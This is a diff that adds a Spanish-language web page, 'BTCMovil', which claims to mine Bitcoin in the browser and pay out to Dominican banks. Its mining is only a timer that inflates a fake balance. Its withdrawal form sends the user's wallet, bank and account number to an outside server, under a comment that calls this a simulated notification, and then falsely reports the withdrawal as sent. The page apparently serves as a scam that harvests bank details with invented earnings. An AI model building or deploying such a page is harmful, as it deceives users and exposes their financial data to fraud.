@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>BTCMovil - Minado y Retiro</title>
+  <style>
+    body {
+      background: #111;
+      color: #f7931a;
+      font-family: 'Segoe UI', sans-serif;
+      text-align: center;
+      padding: 30px;
+    }
+    h1 {
+      font-size: 2.2rem;
+      margin-bottom: 5px;
+    }
+    h2 {
+      color: #fff;
+      font-size: 1.2rem;
+      margin: 0;
+    }
+    .card {
+      background: #1a1a1a;
+      padding: 20px;
+      margin: 20px auto;
+      max-width: 400px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px #f7931a33;
+    }
+    input, select, button {
+      padding: 10px;
+      margin: 10px 0;
+      width: 100%;
+      font-size: 1rem;
+      border-radius: 6px;
+      border: none;
+    }
+    input, select {
+      background: #222;
+      color: #f7931a;
+    }
+    button {
+      background-color: #f7931a;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .status {
+      margin-top: 10px;
+    }
+    .small {
+      font-size: 0.9rem;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <h1>BTCMovil 🟠</h1>
+  <h2>Minería en tu navegador</h2>
+
+  <div class="card">
+    <p><strong>Wallet BTC:</strong></p>
+    <input id="wallet" placeholder="bc1q..." />
+    <p class="small">Tu minado y retiros se asocian a esta dirección</p>
+
+    <hr />
+    <p>🔨 <strong>Hashes minados:</strong> <span id="hashes">0</span></p>
+    <p>₿ <strong>Saldo BTC:</strong> <span id="saldoBTC">0.00000000</span></p>
+    <p>RD$ <strong>Saldo en pesos:</strong> <span id="saldoDOP">0</span></p>
+    <button onclick="simularMinado()">▶️ Iniciar Minado</button>
+  </div>
+
+  <div class="card">
+    <h2>💸 Retiro a banco dominicano</h2>
+    <select id="banco">
+      <option value="Qik">Qik Banco</option>
+      <option value="Banreservas">Banreservas</option>
+      <option value="Popular">Banco Popular</option>
+      <option value="BHD">Banco BHD</option>
+      <option value="Santa Cruz">Banco Santa Cruz</option>
+      <option value="Caribe">Banco Caribe</option>
+      <option value="Promerica">Banco Promerica</option>
+    </select>
+    <input id="cuenta" placeholder="Número de cuenta bancaria" />
+    <input id="monto" type="number" placeholder="Monto en DOP (mínimo 100)" />
+    <button onclick="retirarBanco()">Solicitar Retiro</button>
+    <p class="status" id="estado"></p>
+  </div>
+
+  <script>
+    let hashes = 0;
+    let wallet = "";
+    const tasa = 3600000; // 1 BTC = 3,600,000 DOP
+    const hashRate = 50; // 50 hashes por segundo
+    const btcPorHash = 0.000000000001; // Simulado
+
+    function simularMinado() {
+      wallet = document.getElementById('wallet').value;
+      if (!wallet || !wallet.startsWith("1") && !wallet.startsWith("3") && !wallet.startsWith("bc1")) {
+        alert("Ingresa una wallet BTC válida");
+        return;
+      }
+
+      setInterval(() => {
+        hashes += hashRate;
+        const btc = hashes * btcPorHash;
+        document.getElementById('hashes').textContent = hashes.toLocaleString();
+        document.getElementById('saldoBTC').textContent = btc.toFixed(8);
+        document.getElementById('saldoDOP').textContent = Math.floor(btc * tasa);
+        localStorage.setItem(wallet + '_saldo', btc.toFixed(8));
+      }, 1000);
+    }
+
+    function retirarBanco() {
+      const banco = document.getElementById('banco').value;
+      const cuenta = document.getElementById('cuenta').value;
+      const monto = parseInt(document.getElementById('monto').value);
+      const estado = document.getElementById('estado');
+      const saldoDOP = parseFloat(document.getElementById('saldoDOP').textContent);
+
+      if (!wallet || !cuenta || isNaN(monto) || monto < 100) {
+        estado.innerHTML = "❌ Datos incompletos o monto muy bajo.";
+        return;
+      }
+
+      if (monto > saldoDOP) {
+        estado.innerHTML = "❌ No tienes suficiente saldo.";
+        return;
+      }
+
+      // Simular notificación por correo
+      fetch("https://teoo.onrender.com/api/retiro-banco", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          wallet, banco, cuenta, monto
+        })
+      });
+
+      estado.innerHTML = "✅ Retiro enviado, procesado manualmente.";
+    }
+  </script>
+</body>
+</html>
